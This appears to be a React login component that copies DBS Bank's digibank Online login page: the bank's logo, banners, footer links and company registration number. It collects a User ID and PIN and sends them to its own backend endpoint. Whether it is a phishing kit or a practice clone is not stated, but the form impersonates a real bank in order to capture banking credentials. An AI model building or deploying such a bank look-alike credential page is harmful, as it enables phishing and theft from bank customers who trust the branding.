import { useState, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import './Login.css'

export default function Login() {
  const [userid, setUserid] = useState('')
  const [pin, setPin] = useState('')
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [shake, setShake] = useState(false)
  const [submitted, setSubmitted] = useState(false)
  const navigate = useNavigate() 


  useEffect(() => {
    const checkAuth = async () => {
      try {
        const check = await fetch('http://localhost:3000/api/IB/Welcome', {
          method: 'GET',
          credentials: 'include',
          headers: {
    'Authorization': `Bearer ${localStorage.getItem('authToken')}`
  }
        })
        
        if (check.ok) {
          // already logged in, kick them to profile immediately
          navigate('/member/IB/profile')
        }
      } catch {
        // not logged in, stay on login page
        console.log('...')
      }
    }
    
    checkAuth()
}, [])



  const handleSubmit = async (e) => {
    e.preventDefault()
    setError('')
    setLoading(true)
    try {
      const response = await fetch('http://localhost:3000/api/postinglogin', {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json', Accept: 'application/json' },
        body: JSON.stringify({ userid, regpass: pin }),
      })
      if (!response.ok) {
        const result = await response.json();
        const msg = await result.message;
        setError(msg || 'Invalid User ID or PIN. Please try again.')
        setShake(true)
        setTimeout(() => setShake(false), 600)
        setLoading(false)
        return
      }
      const result = await response.json()
      localStorage.setItem('authToken', result.token)

      setSubmitted(true)
      setTimeout(() => navigate('/member/IB/profile'), 1200)
    } catch {
      setError('Network error. Please try again.')
      setShake(true)
      setTimeout(() => setShake(false), 600)
      setLoading(false)
    }
  }

  return (
    <div className="dbs-root">

      {/* Left: background image */}
      <div className="dbs-bg" />

      {/* Right: white login panel */}
      <div className="dbs-panel">

        {/* DBS Logo */}
        <div className="dbs-logo">
          <img src="/images/singalogol.png" alt="DBS" className="dbs-logo-img" />
        </div>

        {/* Yellow alert */}
        <div className="dbs-alert">
          <span className="dbs-alert-icon">⚠</span>
          <div>
            <div className="dbs-alert-title">A refreshed digibank Online experience is here</div>
            <div className="dbs-alert-sub">
              Designed to support your everyday banking needs. Learn more <a href="#" className="dbs-underline-link">here</a>.
            </div>
          </div>
        </div>

        {/* Login form */}
        <form onSubmit={handleSubmit} className={`dbs-form ${shake ? 'shake' : ''}`}>
          <div className="dbs-field">
            <input
              type="text"
              className="dbs-input"
              placeholder="User ID"
              value={userid}
              onChange={e => setUserid(e.target.value)}
              required
              autoComplete="username"
            />
          </div>
          <div className="dbs-field">
            <input
              type="password"
              className="dbs-input"
              placeholder="PIN"
              value={pin}
              onChange={e => setPin(e.target.value)}
              required
              maxLength={15}
              autoComplete="current-password"
            />
          </div>
          {error && <div className="dbs-error">{error}</div>}
          <button
            type="submit"
            className={`dbs-login-btn${submitted ? ' success' : ''}`}
            disabled={loading || submitted}
          >
            {submitted ? 'Authenticated ✓' : loading ? 'Verifying...' : 'Log in'}
          </button>
        </form>

        {/* Forgot / Register */}
        <div className="dbs-bottom-links">
          <p className="dbs-forgot">
            Forgot <a href="#" className="dbs-red-link">User ID</a> or <a href="#" className="dbs-red-link">PIN?</a>
          </p>
          <a href="#" className="dbs-register">Register for digibank access</a>
        </div>

        {/* Help & Security row */}
        <div className="dbs-help-row">
          <a href="#" className="dbs-help-item">
            <span className="dbs-help-icon">ⓘ</span> Help &amp; Support
          </a>
          <a href="#" className="dbs-help-item">
            <span className="dbs-help-icon">🔒</span> Security &amp; You
          </a>
        </div>

        {/* Scheduled Maintenance */}
        <div className="dbs-maintenance">
          <a href="#" className="dbs-maint-link">Scheduled Maintenance</a>
        </div>

        {/* Bottom footer links */}
        <div className="dbs-panel-footer">
          <a href="#">Terms &amp; Conditions</a>
          <a href="#">Privacy Policy</a>
          <a href="#">Fair Dealing Commitment</a>
          <a href="#">Compliance with Tax Requirements</a>
          <a href="#">Vulnerability Disclosure Policy with Tax Requirements</a>
          <span>©2026 DBS Bank Ltd Co. Reg. No. 196800306E</span>
        </div>

      </div>
    </div>
  )
}